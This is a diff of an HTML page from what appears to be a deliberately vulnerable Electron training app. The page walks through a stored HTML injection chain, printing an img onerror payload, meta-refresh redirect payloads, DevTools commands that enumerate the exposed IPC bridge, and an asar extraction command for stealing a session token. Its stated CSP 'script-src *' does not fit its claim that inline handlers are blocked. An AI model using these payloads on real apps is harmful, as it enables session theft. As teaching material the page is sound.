@@ -1,126 +1,156 @@
 <!doctype html>
 <html>
   <head>
+    <meta charset="UTF-8" />
     <title>Stored HTML Injection → IPC Token Exfiltration</title>
     <link rel="stylesheet" href="../styles/style.css" />
   </head>
   <body>
-    <h1>Stored HTML Injection → IPC Token Exfiltration</h1>
-    <section class="panel">
-      <div class="panel-body">
-        <b>Security Feature Checklist (analytics window):</b>
-        <ul>
-          <li>NodeIntegration: <b>false</b> ✅</li>
-          <li>ContextIsolation: <b>true</b> ✅</li>
-          <li>Sandbox: <b>true</b> ✅</li>
-          <li>Content-Security-Policy: <b>script-src *</b> ✅</li>
-          <li>IPC Sender Validation: <b>false</b> ❌</li>
-        </ul>
-      </div>
-      <div class="panel-header">
-        <h2>Guide: What is happening?</h2>
-      </div>
-      <div class="panel-body">
-        <p>
-          A user's display name is stored and rendered inside an in-app analytics window using
-          <code>innerHTML</code>, without sanitization. The analytics window has a
-          <strong>Content-Security-Policy</strong> that blocks inline scripts and event handlers —
-          so direct XSS is prevented. However, HTML injection still works because
-          <code>&lt;meta http-equiv="refresh"&gt;</code> is not a script and CSP does not
-          restrict it.
-        </p>
-        <p>
-          The analytics window's preload script exposes a <code>getToken()</code> IPC bridge with
-          <strong>no sender validation</strong>. Any page that ends up loaded in that window —
-          including an attacker's redirect target — can call it freely.
-        </p>
+    <header class="page-header">
+      <a href="index.html" class="page-header-back">← All Vulnerabilities</a>
+      <h1>Stored HTML Injection → IPC Token Exfiltration</h1>
+      <p class="page-header-sub">
+        CSP blocks XSS but not meta-refresh; preload bridge has no sender validation
+      </p>
+    </header>
 
-        <b>Step 0 — Reconnaissance: enumerate exposed IPC bridges</b>
-        <p>
-          Before crafting a payload, an attacker discovers what APIs are available. Two methods:
-        </p>
-        <ul>
-          <li>
-            <strong>DevTools console</strong> — This app opens DevTools on every window (a common
-            Electron development practice that often ships to production). Open the analytics window
-            with any benign name, then in its DevTools console:
-            <pre><code>// Step 1: find what the preload added to window
+    <div class="page-wrap">
+      <div class="checklist">
+        <span class="checklist-item pass">✓ NodeIntegration: false</span>
+        <span class="checklist-item pass">✓ ContextIsolation: true</span>
+        <span class="checklist-item pass">✓ Sandbox: true</span>
+        <span class="checklist-item pass">✓ CSP: script-src *</span>
+        <span class="checklist-item fail">✗ IPC Sender Validation: none</span>
+      </div>
+
+      <section class="panel">
+        <div class="panel-header"><h2>Guide: What is happening?</h2></div>
+        <div class="panel-body">
+          <p>
+            A user's display name is stored and rendered inside an in-app analytics window using
+            <code>innerHTML</code>, without sanitization. The analytics window has a
+            <strong>Content-Security-Policy</strong> that blocks inline scripts and event handlers —
+            so direct XSS is prevented. However, HTML injection still works because
+            <code>&lt;meta http-equiv="refresh"&gt;</code> is not a script and is not covered by
+            any CSP directive.
+          </p>
+          <p>
+            The analytics window's preload exposes a <code>getToken()</code> IPC bridge with
+            <strong>no sender validation</strong>. Any page loaded in that window — including an
+            attacker's redirect target — can call it freely.
+          </p>
+        </div>
+      </section>
+
+      <section class="panel" style="margin-top: 1.25rem">
+        <div class="panel-header"><h2>Attack Chain</h2></div>
+        <div class="panel-body">
+
+          <div class="step-block">
+            <div class="step-num muted">0</div>
+            <div class="step-body">
+              <b>Reconnaissance — enumerate exposed IPC bridges</b>
+              <p>
+                Before crafting a payload, an attacker discovers what APIs are available via two
+                methods:
+              </p>
+              <p>
+                <strong>DevTools console</strong> — This app opens DevTools on every analytics
+                window (a common Electron development practice that often ships to production).
+                Open the window with any benign name, then in its console:
+              </p>
+              <pre><code>// Find what the preload added to window
 Object.keys(window).filter(k => typeof window[k] === 'object' && window[k] !== null)
 // → [..., "analyticsAPI", ...]
 
-// Step 2: enumerate its methods
+// Enumerate its methods
 Object.keys(window.analyticsAPI)
-// → ["getToken"]</code></pre>
-            <code>contextBridge.exposeInMainWorld('analyticsAPI', ...)</code> simply sets a
-            property on <code>window</code>, so it shows up alongside every standard browser
-            global. Typing <code>window.</code> in DevTools and waiting for autocomplete reveals
-            it immediately.
-          </li>
-          <li>
-            <strong>ASAR extraction</strong> — Electron apps ship their source code inside an
-            <code>app.asar</code> archive. Anyone can extract it with
-            <code>npx asar extract app.asar ./out</code> and read all preload scripts in plaintext,
-            including exactly which IPC channels are registered.
-          </li>
-        </ul>
+// → ["onName", "getToken"]</code></pre>
+              <p>
+                <code>contextBridge.exposeInMainWorld('analyticsAPI', ...)</code> sets a property
+                directly on <code>window</code>, so it shows up alongside every standard browser
+                global. Typing <code>window.</code> in DevTools and waiting for autocomplete
+                reveals it immediately.
+              </p>
+              <p>
+                <strong>ASAR extraction</strong> — Electron apps ship source inside an
+                <code>app.asar</code> archive. Anyone can extract it with:
+              </p>
+              <pre><code>npx asar extract app.asar ./out</code></pre>
+              <p>
+                All preload scripts are readable in plaintext, including exactly which IPC channels
+                are registered.
+              </p>
+            </div>
+          </div>
 
-        <b>Stage 1 — Try XSS first (blocked by CSP):</b>
-        <ul>
-          <li>
-            <pre><code>&lt;img src=x onerror="window.location.href='https://example.com'"&gt;</code></pre>
-            <span class="text-small text-gray">
-              The CSP blocks the inline <code>onerror</code> handler. The analytics window opens
-              but the redirect never fires. Check DevTools console for the CSP violation.
-            </span>
-          </li>
-        </ul>
+          <div class="step-block">
+            <div class="step-num warn">1</div>
+            <div class="step-body">
+              <b>Stage 1 — Try XSS first <span class="step-badge blocked">BLOCKED BY CSP</span></b>
+              <pre><code>&lt;img src=x onerror="window.location.href='https://example.com'"&gt;</code></pre>
+              <span class="text-small text-gray">
+                The CSP (<code>script-src *</code>) blocks the inline <code>onerror</code> handler.
+                The analytics window opens but the redirect never fires. Check DevTools console for
+                the CSP violation report.
+              </span>
+            </div>
+          </div>
 
-        <b>Stage 2 — HTML injection bypasses CSP (open redirect):</b>
-        <ul>
-          <li>
-            <pre><code>&lt;meta http-equiv="refresh" content="0;URL=https://example.com"&gt;</code></pre>
-            <span class="text-small text-gray">
-              No JavaScript — pure HTML. CSP does not cover meta-refresh. The analytics window
-              redirects to an external site. No address bar means the user has no signal the
-              window is no longer inside the legitimate app.
-            </span>
-          </li>
-        </ul>
+          <div class="step-block">
+            <div class="step-num ok">2</div>
+            <div class="step-body">
+              <b>Stage 2 — HTML injection bypasses CSP <span class="step-badge bypass">CSP BYPASS</span></b>
+              <pre><code>&lt;meta http-equiv="refresh" content="0;URL=https://example.com"&gt;</code></pre>
+              <span class="text-small text-gray">
+                No JavaScript — pure HTML. CSP does not cover meta-refresh. The analytics window
+                redirects to an external site. There is no address bar, so the user has no signal
+                the window is no longer inside the legitimate app.
+              </span>
+            </div>
+          </div>
 
-        <b>Stage 3 — Escalation: token exfiltration via unvalidated IPC bridge:</b>
-        <ul>
-          <li>
-            <pre><code>&lt;meta http-equiv="refresh" content="0;URL=attacker-grab-token.html"&gt;</code></pre>
-            <span class="text-small text-gray">
-              Same HTML injection redirects to the attacker page. The preload is still active
-              (bound to the window, not the URL). The attacker page calls
-              <code>window.analyticsAPI.getToken()</code> and the main process returns the session
-              token with no validation.
-            </span>
-          </li>
-        </ul>
-      </div>
-      <div class="xss-explanation">
-        <strong>Why this matters in a desktop app:</strong> In a browser, an open redirect is
-        low-severity because the address bar reveals the destination. In an Electron app there is
-        no address bar — the user has no signal that the window has navigated away. Combined with
-        an unvalidated IPC bridge, this escalates from HTML injection to full session token
-        exfiltration without any JavaScript execution on the vulnerable page itself.
-      </div>
-    </section>
+          <div class="step-block">
+            <div class="step-num danger">3</div>
+            <div class="step-body">
+              <b>Stage 3 — Escalation: token exfiltration via unvalidated IPC bridge <span class="step-badge escalate">ESCALATION</span></b>
+              <pre><code>&lt;meta http-equiv="refresh" content="0;URL=attacker-grab-token.html"&gt;</code></pre>
+              <span class="text-small text-gray">
+                Same HTML injection redirects to the attacker page. The preload is still active —
+                it is bound to the window, not the URL. The attacker page calls
+                <code>window.analyticsAPI.getToken()</code> and the main process returns the session
+                token with no validation.
+              </span>
+            </div>
+          </div>
 
-    <form id="profileForm">
-      <label for="displayName">Display Name:</label>
-      <input
-        type="text"
-        id="displayName"
-        style="width: 100%; margin-bottom: 8px"
-        placeholder='<meta http-equiv="refresh" content="0;URL=https://example.com">'
-      />
-      <button type="submit" class="btn btn-primary">Save &amp; Open Analytics Dashboard</button>
-    </form>
+        </div>
+        <div class="xss-explanation">
+          <strong>Why this matters in a desktop app:</strong> In a browser, an open redirect is
+          low-severity because the address bar reveals the destination. In an Electron app there is
+          no address bar — the user has no signal that the window has navigated away. Combined with
+          an unvalidated IPC bridge, this escalates from HTML injection to full session token
+          exfiltration without any JavaScript execution on the vulnerable page.
+        </div>
+      </section>
 
-    <a href="index.html" class="btn btn-link">← Back to Vulnerabilities</a>
+      <section class="panel demo-panel">
+        <div class="panel-header"><h2>Demo</h2></div>
+        <div class="panel-body">
+          <form id="profileForm">
+            <label for="displayName">Display Name:</label>
+            <input
+              type="text"
+              id="displayName"
+              placeholder='<meta http-equiv="refresh" content="0;URL=https://example.com">'
+            />
+            <button type="submit" class="btn btn-primary">Save &amp; Open Analytics Dashboard</button>
+          </form>
+        </div>
+      </section>
+
+    </div>
+
     <script src="../js/stored-htmli.js"></script>
   </body>
 </html>
